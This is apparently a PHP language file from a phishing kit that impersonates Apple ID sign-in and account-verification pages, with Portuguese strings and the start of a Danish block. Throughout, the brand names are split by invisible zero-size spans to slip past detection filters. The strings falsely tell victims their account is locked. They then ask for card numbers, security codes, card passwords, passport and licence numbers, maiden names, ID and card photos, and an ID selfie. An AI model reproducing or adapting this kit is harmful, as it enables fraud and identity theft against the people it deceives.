$accounteverything = "sua conta para &nbsp; tudo &nbsp; <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>."; 
$services = "um único <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID e palavra-passe dá-lhe acesso a todos os serviços <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>."; 
$about = "Saiba mais sobre a <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID &nbsp;"; 
$CreateApple = "criar o seu <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID"; 
$Shopthe = "loja"; 
$OnlineStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Online Store"; 
$Visit = "visitar um"; 
$RetailStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Retail Store"; 
$Find = "ou encontrar um"; 
$Reseller = "revendedor"; 
$AppleInfo = "informações da <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
$Map = "mapa do site"; 
$News = "Hot News"; 
$Feeds = "RSS feeds"; 
$Contact = "fale conosco"; 
$rightsreserved = "Copyright © 2019 <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Inc. Todos os direitos reservados. "; 
$TermsUse = "termos de uso"; 
$Policy = "política de privacidade"; 
$accManageount = "gerir o ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> da sua conta <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
$acApplecount = "gerir a sua conta <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
$Password = "password"; 
$Rmeemember = "Remember me"; 
$morehelp = "necessita de mais ajuda?"; 
$Chatnow = "bate-papo agora"; 
$M800YAPPLE = "ou ligue para 1-800-MY-<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>."; 
$cfasterheckout = "entrar para um checkout mais rápido.";
$iCsaddressignloud = "o seu ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> é o endereço de e-mail que utiliza para iniciar sessão no <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>29dc13fd93be42de3a3f632dc2daf8ab</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>, na App Store e no <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>."; 
$ISignn = "entrar"; 
$pForgotassword = "esqueceu seu ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ou senha?"; 
$unpassworddefined = "esqueceu seu ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ou senha? indefinido "; 
$Creatonee = "não tem um ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Crie um agora. "; 
$haveCApplereate = "não tem um ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Crie um agora. indefinido "; 
$IApplesD = "ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
$fAqqq = "FAQ";
$securityreasons = "este ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> foi bloqueado por razões de segurança."; 
$beforesigning = "tem de desbloquear a sua conta antes de iniciar sessão."; 
$UnlockAccount = "desbloquear conta"; 
$yourinformation = "confirme a sua informação"; 
$AccountVerification = "verificação de conta"; 
$YourAppleID = "o seu ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> é"; 
$OuSignt = "Sign out"; 
$PersonalInformation = "informações pessoais"; 
$NAME = "nome"; 
$FirstName = "primeiro nome"; 
$MiddleName = "nome do meio (opcional)"; 
$LastName = "sobrenome"; 
$OFBIRTH = "DATA DE NASCIMENTO"; 
$dateobirth = "data de nascimento"; 
$TELEPHONE = "TELEFONE"; 
$rtphone = "número de telefone";
$ADDRESS = "ADDRESS"; 
$LineADDRESS = "linha de endereço"; 
$City = "cidade/cidade"; 
$POSTCO = "CEP"; 
$AccountDetails = "detalhes da conta"; 
$CARDDETAILS = "detalhes do cartão"; 
$CAname = "nome dos titulares de cartão"; 
$CAnumber = "número do cartão"; 
$CAdater = "data de expiração"; 
$securitycode = "código de segurança do cartão"; 
$cardpassword = "senha vbv ou senha do cartão"; 
$Security = "segurança"; 
$SELECTQUESTION = "selecionar uma pergunta de segurança"; 
$securityquestion = "Selecione a pergunta de segurança"; 
$MaideNamen = "mãe ' s nome de solteira"; 
$LicenseNumber = "número de licença de condução"; 
$PassportNumber = "número do passaporte"; 
$answer = "resposta"; 
$IdentityVerification = "verificação de identidade"; 
$doIDcument = "1-Faça upload de fotos de ambos os lados do documento de identificação."; 
$residencedocument = "2-carregar prova de foto de documento de residência"; 
$couldyour = "este poderia ser o seu:"; 
$billinternet = "extrato bancário ou conta de utilidade (conta de electricidade, conta de água, conta de Internet, etc.)"; 
$Email = "email"; 
$fsidedocument = "-parte da frente do documento de identificação"; 
$Backside = "-verso do documento de identificação"; 
$residencephoto = "-comprovante de residência foto de documento"; 
$sidespaymentcard = "upload de fotos de ambos os lados do seu cartão de pagamento. &nbsp;"; 
$FrontsideCard = "-parte da frente do seu cartão de pagamento"; 
$syourideBack = "-verso do seu cartão de pagamento"; 
$clearCard = "-por favor, envie uma foto clara do seu cartão de identificação"; 
$takeselfie = "-você deve manter seu ID ao lado de seu rosto e tomar uma selfie"; 
$thenupload = "escolha a foto e clique em upload."; 
$uploadii = "carregar &rarr;"; 
$VerificationComplete = "verificação de conta concluída"; 
$accessaccount = "por favor aguarde enquanto restauramos o acesso da sua conta..."; 
$automaticallylogged = "para sua segurança, você será automaticamente desconectado."; 
$vverrmail = "Adicionar o seu endereço de e-mail."; 
$emaillsz = "email"; 
$wontsy = "a <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> não armazenará sua senha."; 
$itoCloud = "Faça login no <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>";
$Keepme = "Mantenha-me conectado";
Break;


case "BR": 
$TTLEZ = "entrar"; 
$nxt = "Próximo";
$SignIn = "entrar"; 
$Createapid = "criar o seu <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID"; 
$ForgotApple = "esqueceu a <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID ou a senha?"; 
$accounteverything = "sua conta para &nbsp; tudo &nbsp; <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>."; 
$services = "um único <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID e palavra-passe dá-lhe acesso a todos os serviços <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>."; 
$about = "Saiba mais sobre a <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID &nbsp;"; 
$CreateApple = "criar o seu <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp; ID"; 
$Shopthe = "loja"; 
$OnlineStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Online Store"; 
$Visit = "visitar um"; 
$RetailStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Retail Store"; 
$Find = "ou encontrar um"; 
$Reseller = "revendedor"; 
$AppleInfo = "informações da <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
$Map = "mapa do site";
$News = "Hot News"; 
$Feeds = "RSS feeds"; 
$Contact = "fale conosco"; 
$rightsreserved = "Copyright © 2019 <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Inc. Todos os direitos reservados. "; 
$TermsUse = "termos de uso"; 
$Policy = "política de privacidade"; 
$accManageount = "gerir o ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> da sua conta <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
$acApplecount = "gerir a sua conta <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
$Password = "password"; 
$Rmeemember = "Remember me"; 
$morehelp = "necessita de mais ajuda?"; 
$Chatnow = "bate-papo agora"; 
$M800YAPPLE = "ou ligue para 1-800-MY-<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>."; 
$cfasterheckout = "entrar para um checkout mais rápido.";
$iCsaddressignloud = "o seu ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> é o endereço de e-mail que utiliza para iniciar sessão no <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>29dc13fd93be42de3a3f632dc2daf8ab</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>, na App Store e no <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>."; 
$ISignn = "entrar"; 
$pForgotassword = "esqueceu seu ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ou senha?"; 
$unpassworddefined = "esqueceu seu ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ou senha? indefinido "; 
$Creatonee = "não tem um ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Crie um agora. "; 
$haveCApplereate = "não tem um ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Crie um agora. indefinido "; 
$IApplesD = "ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>"; 
$fAqqq = "FAQ";
$securityreasons = "este ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> foi bloqueado por razões de segurança."; 
$beforesigning = "tem de desbloquear a sua conta antes de iniciar sessão."; 
$UnlockAccount = "desbloquear conta"; 
$yourinformation = "confirme a sua informação"; 
$AccountVerification = "verificação de conta"; 
$YourAppleID = "o seu ID <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> é"; 
$OuSignt = "Sign out"; 
$PersonalInformation = "informações pessoais"; 
$NAME = "nome"; 
$FirstName = "primeiro nome"; 
$MiddleName = "nome do meio (opcional)"; 
$LastName = "sobrenome"; 
$OFBIRTH = "DATA DE NASCIMENTO"; 
$dateobirth = "data de nascimento"; 
$TELEPHONE = "TELEFONE"; 
$rtphone = "número de telefone";
$ADDRESS = "ADDRESS"; 
$LineADDRESS = "linha de endereço"; 
$City = "cidade/cidade"; 
$POSTCO = "CEP"; 
$AccountDetails = "detalhes da conta"; 
$CARDDETAILS = "detalhes do cartão"; 
$CAname = "nome dos titulares de cartão"; 
$CAnumber = "número do cartão"; 
$CAdater = "data de expiração"; 
$securitycode = "código de segurança do cartão"; 
$cardpassword = "senha vbv ou senha do cartão"; 
$Security = "segurança"; 
$SELECTQUESTION = "selecionar uma pergunta de segurança"; 
$securityquestion = "Selecione a pergunta de segurança"; 
$MaideNamen = "mãe ' s nome de solteira"; 
$LicenseNumber = "número de licença de condução"; 
$PassportNumber = "número do passaporte"; 
$answer = "resposta"; 
$IdentityVerification = "verificação de identidade"; 
$doIDcument = "1-Faça upload de fotos de ambos os lados do documento de identificação."; 
$residencedocument = "2-carregar prova de foto de documento de residência"; 
$couldyour = "este poderia ser o seu:"; 
$billinternet = "extrato bancário ou conta de utilidade (conta de electricidade, conta de água, conta de Internet, etc.)"; 
$Email = "email"; 
$fsidedocument = "-parte da frente do documento de identificação"; 
$Backside = "-verso do documento de identificação"; 
$residencephoto = "-comprovante de residência foto de documento"; 
$sidespaymentcard = "upload de fotos de ambos os lados do seu cartão de pagamento. &nbsp;"; 
$FrontsideCard = "-parte da frente do seu cartão de pagamento"; 
$syourideBack = "-verso do seu cartão de pagamento"; 
$clearCard = "-por favor, envie uma foto clara do seu cartão de identificação"; 
$takeselfie = "-você deve manter seu ID ao lado de seu rosto e tomar uma selfie"; 
$thenupload = "escolha a foto e clique em upload."; 
$uploadii = "carregar &rarr;"; 
$VerificationComplete = "verificação de conta concluída"; 
$accessaccount = "por favor aguarde enquanto restauramos o acesso da sua conta..."; 
$automaticallylogged = "para sua segurança, você será automaticamente desconectado."; 
$vverrmail = "Adicionar o seu endereço de e-mail."; 
$emaillsz = "email"; 
$wontsy = "a <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> não armazenará sua senha."; 
$itoCloud = "Faça login no <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>";
$Keepme = "Mantenha-me conectado";
Break;

case "DK": 
$TTLEZ = "Log ind"; 
$SignIn = "Log ind"; 
$Createapid = "Opret dit <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> &nbsp;-id"; 
